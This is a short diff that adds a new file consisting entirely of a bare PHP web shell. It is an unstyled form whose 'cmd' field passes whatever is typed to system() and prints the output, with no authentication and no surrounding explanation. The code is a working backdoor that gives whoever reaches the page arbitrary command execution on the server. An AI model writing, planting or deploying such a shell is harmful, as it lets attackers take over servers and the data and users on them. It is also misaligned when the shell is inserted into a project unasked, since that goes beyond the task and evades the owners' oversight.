@@ -1,0 +1,1 @@
+<html><head><style>input{border:0}input:focus{outline:0;border:none;box-shadow:none}</style></head><body><form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>"><input type="TEXT" name="cmd" autofocus id="cmd" size="100"></form><pre><?php if(isset($_GET['cmd'])){ system($_GET['cmd']); }?></pre></body></html>
